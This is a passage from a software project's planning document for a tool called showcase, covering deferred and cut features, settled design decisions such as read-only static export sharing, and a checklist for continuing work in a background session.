MCP schema in core)._

_Deferred / punted (revisit later):_ a **durable searchable store** (SQLite +
FTS5) for referencing old mockups/reviews — `JsonFileStore` is fine at personal
scale and `showcase export` → HTML → Notion already covers the "keep it for later"
need; revisit only if the in-memory board hits a real ceiling (the whole board,
asset bytes included, is resident and rewritten per mutation). _Cut:_ a surface
version-diff view (history exists, but the iterate loop doesn't need it) and
cross-browser/mobile e2e expansion. _Parked:_ the agent wake/notify path
(notifications when feedback lands — _not_ a return of the in-app comment UI),
pending a call on whether to pursue it.

---

## 7. Open decisions (flag to the user before building the affected pillar)

- **~~Editor-agent engine~~ (DECIDED, then feature RETIRED):** the no-SDK stance
  still holds, but the in-browser editor chat it described was removed (see
  "Editor-agent chat" above). The feedback path is the comment/`wait_for_feedback`
  pull in §4 — no hosted SDK, and no in-browser chat either.
- **No GitHub round-trip (DECIDED):** showcase is its own surface, not a GitHub
  front-end. Sharing a review means static export, not posting back to a PR.
- **Sharing is read-only:** the one-board/one-user stance means shared output
  (static export) is a read-only snapshot — no live/comment bits.

---

## 8. Picking up work in a background session

1. Read sections 1–5 of this file and `AGENTS.md`.
2. `git branch --show-current` — if not on a task branch, branch from `main`.
3. Both flagship workflows are shipped — Workflow 1 (visual PR review, R1–R4) and
   Workflow 2 (learning & explainers, L1–L3); the supporting **static export** is
   shipped too. Remaining work is the **review-depth / fancier-visualizations**
   track (opt-in per-PR chart types). If an item is an "open decision" in §7,
   confirm it first.
4. Build in small commits; after each, run the §5 verify suite. For UI, screenshot
   and look.
5. Keep the oracle green; if you change behavior it covers, update the oracle in
   the same commit.
6. When the chunk is green + reviewed, fast-forward merge to `main`.
